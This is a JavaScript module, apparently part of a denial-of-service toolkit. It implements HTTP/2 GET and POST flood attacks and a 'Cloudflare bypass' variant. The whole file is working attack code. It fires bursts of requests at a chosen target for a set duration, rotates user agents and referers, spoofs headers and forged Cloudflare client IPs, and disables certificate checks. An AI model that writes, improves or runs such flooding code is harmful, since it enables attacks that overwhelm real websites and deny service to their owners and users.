import http2 from 'http2';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { logger } from '../../utils/logger.js';

/**
 * HTTP/2 Flood Attack
 */
export class HTTP2Flood {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = rpc;
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            await this.attack();
        }
    }

    generateHeaders() {
        const headers = {
            ':method': 'GET',
            ':path': this.url.pathname + this.url.search,
            ':scheme': this.url.protocol.replace(':', ''),
            ':authority': this.url.host,
            'user-agent': this.userAgents.length > 0 
                ? Tools.randomChoice(this.userAgents)
                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
            'cache-control': 'max-age=0',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            ...Tools.generateSpoofHeaders(this.url.host)
        };

        if (this.referers.length > 0) {
            headers['referer'] = Tools.randomChoice(this.referers) + this.url.href;
        }

        return headers;
    }

    async attack() {
        return new Promise((resolve) => {
            const client = http2.connect(this.url.origin, {
                rejectUnauthorized: false
            });

            client.on('error', () => {
                client.close();
                resolve();
            });

            const makeRequest = () => {
                if (!this.active) {
                    client.close();
                    resolve();
                    return;
                }

                try {
                    const req = client.request(this.generateHeaders());

                    req.on('response', () => {
                        REQUESTS_SENT.add(1);
                    });

                    req.on('data', () => {});
                    req.on('end', () => {});
                    req.on('error', () => {});

                    req.end();
                    BYTES_SENT.add(200); // Approximate header size
                } catch (e) {
                    // Silent fail
                }
            };

            for (let i = 0; i < this.rpc; i++) {
                makeRequest();
            }

            setTimeout(() => {
                client.close();
                resolve();
            }, 1000);
        });
    }

    stop() {
        this.active = false;
    }
}

/**
 * HTTP/2 POST Flood Attack
 */
export class HTTP2PostFlood extends HTTP2Flood {
    generateHeaders() {
        const headers = super.generateHeaders();
        headers[':method'] = 'POST';
        headers['content-type'] = 'application/json';
        return headers;
    }

    generatePayload() {
        return JSON.stringify({
            data: Tools.randomString(512)
        });
    }

    async attack() {
        return new Promise((resolve) => {
            const client = http2.connect(this.url.origin, {
                rejectUnauthorized: false
            });

            client.on('error', () => {
                client.close();
                resolve();
            });

            const payload = this.generatePayload();

            const makeRequest = () => {
                if (!this.active) {
                    client.close();
                    resolve();
                    return;
                }

                try {
                    const headers = this.generateHeaders();
                    headers['content-length'] = Buffer.byteLength(payload);

                    const req = client.request(headers);

                    req.on('response', () => {
                        REQUESTS_SENT.add(1);
                    });

                    req.on('data', () => {});
                    req.on('end', () => {});
                    req.on('error', () => {});

                    req.write(payload);
                    req.end();
                    
                    BYTES_SENT.add(Buffer.byteLength(payload) + 200);
                } catch (e) {
                    // Silent fail
                }
            };

            for (let i = 0; i < this.rpc; i++) {
                makeRequest();
            }

            setTimeout(() => {
                client.close();
                resolve();
            }, 1000);
        });
    }
}

/**
 * HTTP/2 Cloudflare Bypass
 */
export class HTTP2CFBypass extends HTTP2Flood {
    generateHeaders() {
        const headers = super.generateHeaders();
        
        // Add Cloudflare bypass headers
        headers['cf-ray'] = Tools.randomString(16);
        headers['cf-connecting-ip'] = Tools.randomIPv4();
        headers['cf-ipcountry'] = 'US';
        headers['cf-visitor'] = '{"scheme":"https"}';
        headers['cdn-loop'] = 'cloudflare';
        
        return headers;
    }

    async attack() {
        return new Promise((resolve) => {
            const client = http2.connect(this.url.origin, {
                rejectUnauthorized: false,
                // Use modern ALPN protocols
                ALPNProtocols: ['h2', 'http/1.1']
            });

            client.on('error', () => {
                client.close();
                resolve();
            });

            const makeRequest = () => {
                if (!this.active) {
                    client.close();
                    resolve();
                    return;
                }

                try {
                    const req = client.request(this.generateHeaders(), {
                        weight: 256,
                        exclusive: false
                    });

                    req.on('response', () => {
                        REQUESTS_SENT.add(1);
                    });

                    req.on('data', () => {});
                    req.on('end', () => {});
                    req.on('error', () => {});

                    req.end();
                    BYTES_SENT.add(250);
                } catch (e) {
                    // Silent fail
                }
            };

            for (let i = 0; i < this.rpc; i++) {
                makeRequest();
            }

            setTimeout(() => {
                client.close();
                resolve();
            }, 1000);
        });
    }
}
